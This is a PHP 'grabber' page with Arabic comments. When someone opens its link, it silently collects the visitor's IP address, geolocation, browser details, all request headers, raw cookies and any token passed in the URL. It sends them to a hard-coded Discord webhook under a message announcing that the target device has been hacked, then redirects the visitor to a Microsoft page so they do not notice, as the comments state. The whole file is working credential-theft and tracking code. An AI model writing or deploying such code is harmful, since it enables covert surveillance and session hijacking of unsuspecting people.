<?php
// ============================================================
// ملف index.php - إرسال Webhook إلى Discord عند فتح الرابط
// ============================================================

// 1. تحديد بيانات الطلب
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$referer = $_SERVER['HTTP_REFERER'] ?? 'مباشر';
$time = date('Y-m-d H:i:s');
$method = $_SERVER['REQUEST_METHOD'];

// 2. محاولة جلب التوكنات المخزنة في الكوكيز (إذا أرسلها السكريبت)
$token = $_GET['token'] ?? 'غير متوفر';
$cookies_raw = $_SERVER['HTTP_COOKIE'] ?? 'غير متوفر';

// 3. محاولة جلب بيانات إضافية عبر طلب خارجي (اختياري - قد يكون محجوباً)
$location_data = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,isp,org,as");
$location = $location_data ? json_decode($location_data, true) : [];

// 4. بناء مصفوفة المعلومات التفصيلية
$info = [
    'ip' => $ip,
    'user_agent' => $user_agent,
    'referer' => $referer,
    'time' => $time,
    'method' => $method,
    'token_passed' => $token,
    'cookies_raw' => $cookies_raw,
    'geo_country' => $location['country'] ?? 'غير معروف',
    'geo_city' => $location['city'] ?? 'غير معروف',
    'geo_isp' => $location['isp'] ?? 'غير معروف',
    'os_guess' => (strpos($user_agent, 'Windows NT 10.0') !== false) ? 'Windows 11/10' : 'غير ويندوز',
    'browser' => (strpos($user_agent, 'Firefox') !== false) ? 'Firefox' : ((strpos($user_agent, 'Chrome') !== false) ? 'Chrome' : ((strpos($user_agent, 'Edge') !== false) ? 'Edge' : 'متصفح آخر')),
    'full_headers' => json_encode(getallheaders(), JSON_UNESCAPED_SLASHES)
];

// 5. تنسيق الرسالة المرسلة إلى ديسكورد
$webhook_url = 'https://discord.com/api/webhooks/1521877435786727425/08q8NTa3ZQiFg6gcH60HNSt8MGZyylfkFYb7tLa48VnCM7R55AA3ULpAuLwHPxqk_9pX'; // غيّر هذا إلى رابط ويب هوك الخاص بك

$embed_color = 0xFF0000; // أحمر للخطر
$embed_fields = [
    ['name' => '📡 IP الخارجي', 'value' => $ip, 'inline' => true],
    ['name' => '🌍 الدولة', 'value' => $info['geo_country'], 'inline' => true],
    ['name' => '🏙️ المدينة', 'value' => $info['geo_city'], 'inline' => true],
    ['name' => '🖥️ مزود الخدمة', 'value' => $info['geo_isp'], 'inline' => false],
    ['name' => '💻 نظام التشغيل', 'value' => $info['os_guess'], 'inline' => true],
    ['name' => '🌐 المتصفح', 'value' => $info['browser'], 'inline' => true],
    ['name' => '⏰ التوقيت', 'value' => $time, 'inline' => false],
    ['name' => '🔗 المرجع (Referer)', 'value' => $referer, 'inline' => false],
    ['name' => '🍪 الكوكيز الخام', 'value' => substr($cookies_raw, 0, 1024), 'inline' => false],
    ['name' => '🔑 التوكن الممرر', 'value' => substr($token, 0, 256), 'inline' => false],
    ['name' => '📄 وكيل المستخدم', 'value' => substr($user_agent, 0, 200), 'inline' => false]
];

$payload = [
    'content' => "🚨 **تم اختراق الجهاز المستهدف (Windows 11)** 🚨",
    'embeds' => [
        [
            'title' => '📋 بيانات الاختراق الفورية',
            'color' => $embed_color,
            'fields' => $embed_fields,
            'footer' => ['text' => 'تم الإرسال بواسطة نظام التجميع التلقائي'],
            'timestamp' => date('c')
        ]
    ]
];

// 6. إرسال البيانات إلى Webhook
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// 7. تسجيل العملية في ملف محلي (احتياطي)
$log_entry = "[{$time}] IP: {$ip} | UA: {$user_agent} | Code: {$http_code}\n";
@file_put_contents('log.txt', $log_entry, FILE_APPEND);

// 8. إعادة توجيه المستخدم إلى موقع شرعي لتضليل الرؤية
header('Location: https://www.microsoft.com/ar-sa/windows');
exit;
?>
